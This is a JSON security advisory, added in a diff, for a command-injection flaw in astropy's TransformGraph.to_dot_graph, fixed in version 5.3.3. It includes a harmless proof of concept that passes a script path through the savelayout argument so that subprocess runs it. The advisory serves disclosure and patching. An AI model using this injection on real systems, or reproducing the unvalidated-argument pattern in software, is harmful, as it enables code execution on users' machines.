@@ -1,0 +1,75 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-h2x6-5jx5-46hf",
+  "modified": "2024-03-18T21:46:18Z",
+  "published": "2024-03-18T20:26:33Z",
+  "aliases": [
+    "CVE-2023-41334"
+  ],
+  "summary": "RCE in TranformGraph().to_dot_graph function",
+  "details": "### Summary\nRCE due to improper input validation in TranformGraph().to_dot_graph function\n\n### Details\n\nDue to improper input validation a malicious user can provide a command or a script file as a value to `savelayout` argument, which will be placed as the first value in a list of arguments passed to `subprocess.Popen`. \nhttps://github.com/astropy/astropy/blob/9b97d98802ee4f5350a62b681c35d8687ee81d91/astropy/coordinates/transformations.py#L539\nAlthough an error will be raised, the command or script will be executed successfully.\n\n### PoC\n\n```shell\n$ cat /tmp/script\n#!/bin/bash\necho astrorce > /tmp/poc.txt\n```\n```shell\n$ python3\nPython 3.9.2 (default, Feb 28 2021, 17:03:44) \n[GCC 10.2.1 20210110] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> from astropy.coordinates.transformations import TransformGraph\n>>> tg = TransformGraph()\n>>> tg.to_dot_graph(savefn=\"/tmp/1.txt\", savelayout=\"/tmp/script\")\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\n  File \"/home/u32i/.local/lib/python3.9/site-packages/astropy/coordinates/transformations.py\", line 584, in to_dot_graph\n    stdout, stderr = proc.communicate(dotgraph)\n  File \"/usr/lib/python3.9/subprocess.py\", line 1134, in communicate\n    stdout, stderr = self._communicate(input, endtime, timeout)\n  File \"/usr/lib/python3.9/subprocess.py\", line 1961, in _communicate\n    input_view = memoryview(self._input)\nTypeError: memoryview: a bytes-like object is required, not 'str'\n>>> \n```\n```shell\n$ cat /tmp/poc.txt\nastrorce\n```\n\n### Impact\ncode execution on the user's machine\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "astropy"
+      },
+      "ecosystem_specific": {
+        "affected_functions": [
+          "astropy.coordinates.transformations.TransformGraph.to_dot_graph"
+        ]
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "5.3.3"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/astropy/astropy/security/advisories/GHSA-h2x6-5jx5-46hf"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-41334"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/astropy/astropy/commit/22057d37b1313f5f5a9b5783df0a091d978dccb5"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/astropy/astropy"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/astropy/astropy/blob/9b97d98802ee4f5350a62b681c35d8687ee81d91/astropy/coordinates/transformations.py#L539"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-74",
+      "CWE-77"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-03-18T20:26:33Z",
+    "nvd_published_at": "2024-03-18T19:15:05Z"
+  }
+}
